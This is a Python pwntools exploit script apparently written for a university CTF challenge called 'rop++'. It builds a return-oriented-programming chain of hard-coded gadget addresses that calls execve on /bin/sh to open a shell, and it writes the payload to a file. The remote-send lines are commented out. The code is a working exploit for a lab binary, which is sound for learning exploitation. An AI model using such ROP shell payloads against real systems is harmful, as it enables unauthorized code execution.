import pwn

pwn.context.log_level = "debug"

# p = pwn.remote("edu-ctf.zoolab.org", 10003)
# p = pwn.process("/home/lemtea/Course/資訊安全實務/pwn/rop++/rop++/share/chal")

# p.recvuntil(b"show me rop\n> ")

mov_rsi_rax = 0x449fa5 # mov qword ptr [rsi], rax ; ret

payload = pwn.flat([
    b"A" * 40,
    pwn.p64(0x401e3f),  # pop rdi; ret
    pwn.p64(0x7fffffffd940),  # /bin/sh
    pwn.p64(0x409e6e),  # pop rsi; ret
    pwn.p64(0),
    # pwn.p64(0x00000000004507ac),  # pop rdx; retf 4
    # pwn.p64(0),
    # pwn.p64(0x0000000000447b27),  # pop rax; ret
    # pwn.p64(0x3b),  # execve

    pwn.p64(0x47ed0a),  # pop rax ; pop rdx ; pop rbx ; ret
    pwn.p64(0x3b),  # rax (syscall number)
    pwn.p64(0x0),  # rdx
    pwn.p64(0x1234),  # rbx (useless)

    pwn.p64(0x401bf4),  # syscall (execve)

    b"/bin/sh\x00",
    b"cat payload\0",
])

with open("payload", "wb") as f:
    f.write(payload)

# p.sendline(payload)

# p.interactive()
